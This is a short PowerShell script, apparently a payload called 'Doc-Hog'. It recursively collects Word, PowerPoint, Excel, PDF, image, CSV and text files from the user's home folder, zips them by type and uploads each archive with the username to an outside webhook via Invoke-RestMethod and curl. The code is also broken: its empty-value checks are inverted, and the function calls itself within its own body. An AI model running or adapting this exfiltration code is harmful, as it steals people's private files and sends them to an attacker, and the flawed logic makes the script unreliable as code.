function Doc-Hog {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$false)]
        [string]$file,
        [parameter(Position=1,Mandatory=$false)]
        [string]$text 
    )

    $Body = @{
        username = $env:username
        content = $text
    }

    if ([string]::IsNullOrEmpty($text)) {
        # Send text to webhook
        Invoke-RestMethod -ContentType "application/json" -Uri $dc  -Method Post -Body (ConvertTo-Json $Body)
    }

    if ([string]::IsNullOrEmpty($file)) {
        # Send file to webhook
        curl.exe -F "File=@$(Resolve-Path $file)" $dc
    }

$Files = Get-ChildItem -Path "$env:HOMEPATH" -Include "*.docx","*.doc","*.pptx","*.xlsx","*.pdf","*.jpeg","*.png","*.jpg","*.csv","*.txt" -Recurse

$types = @{
    "*.docx" = "Word";
    "*.doc" = "Word";
    "*.pptx" = "PowerPoint";
    "*.xlsx" = "Excel";
    "*.pdf" = "PDF";
    "*.jpeg" = "JPEG";
    "*.png" = "PNG";
    "*.jpg" = "JPEG";
    "*.csv" = "CSV";
    "*.txt" = "Text";
}

foreach ($type in $types.Keys) {
    $filteredFiles = $Files | Where-Object {$_.Name -like $type}

    if ($filteredFiles) {
        $zipFile = "$env:TEMP\$($types[$type]).zip"

        $filteredFiles | Compress-Archive -DestinationPath $zipFile

        Doc-Hog -file $zipFile -text "Uploading $($types[$type]) files"
    }
}
}
